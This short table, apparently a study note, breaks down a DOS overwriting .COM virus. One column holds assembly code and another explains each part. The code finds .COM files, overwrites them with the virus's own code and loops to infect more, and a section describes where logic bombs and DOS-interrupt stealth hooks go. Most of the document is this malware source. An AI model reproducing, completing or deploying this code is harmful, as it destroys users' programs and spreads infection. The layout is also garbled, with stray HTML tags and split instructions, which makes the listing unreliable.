Anatomy of a Basic Virus: Full Assembly Code Breakdown

Column 1: label					Column 2: assembly code line by line				Column 3: explanation text



File Header/Initialization			.model tiny<br>.code<br>ORG					Standard .COM file header starting at 100H. Sets up the segment and

&nbsp;						100H<br>START:<br>Code						origin for the virus code, establishing the entry point for the viral

&nbsp;						Segment Assume							lifecycle.

&nbsp;						CS:code,DS:code<br>startvx													\[1, 2]

&nbsp;						proc near



Search Routine					mov ah, 4EH<br>mov dx,						Prepares and executes the DOS Find First function (4EH) using a wildcard

&nbsp;						OFFSET COM\_FILE<br>int						mask (\*.COM) to locate potential host files. The Search Loop (SEARCH\_LP)

&nbsp;						21H<br>SEARCH\_LP:						includes a Jump if Carry (JC) check to terminate if no targets are found.

&nbsp;						<br>jc

&nbsp;						DONE<br>COM\_FILE DB														\[1-3]

&nbsp;						'\*.COM',0															



Copy/Infection					mov ax, 3D02H<br>mov dx,					Opens the target file found in the Disk Transfer Area (DTA offset 9EH)

&nbsp;						9EH<br>int 21H<br>xchg ax,					with read/write access (3D02H). It then uses the DOS Write function (40H) to

&nbsp;						bx<br>mov ah, 40H<br>mov cx,					overwrite the start of the host file with the virus's own code.

&nbsp;						offset endvx - offset

&nbsp;						startvx<br>mov dx, offset													\[1-3]

&nbsp;						startvx<br>int 21H					

&nbsp;											

&nbsp;														

Payload/Optional Routine			; Optional logic bomb<br>; or 					Optional section for routines unrelated to reproduction. This is the 

&nbsp;						stealthing hooks<br>; go here					logical location for payload triggers (e.g., specific dates), logic bombs,  														or stealth functions like Interrupt 21H hooking to hide file changes.



&nbsp;																						\[1, 3]



Restoration/File Closer				mov ah, 3EH<br>int 21H<br>mov 				 	Closes the current file handle (3EH) and searches for the next potential

&nbsp;						ah, 4FH<br>int 21H<br>jmp					to continue the infection loop. Once all targets are processed,

&nbsp;						SEARCH\_LP<br>DONE:						it terminates via RET or INT 20H to return control to the operating system.

&nbsp;						<br>ret<br>int 20H<br>startvx

&nbsp;						endp<br>host (4FH) endvx label 						 							\[1, 2]

&nbsp;						near<br>code ends<br>end											

&nbsp;						START																	



\[1] The Giant Black Book of Computer Viruses.pdf

\[2] overwriting\_virus\_tutorial\_#1.md

\[3] Author's own notes 17/01/2026

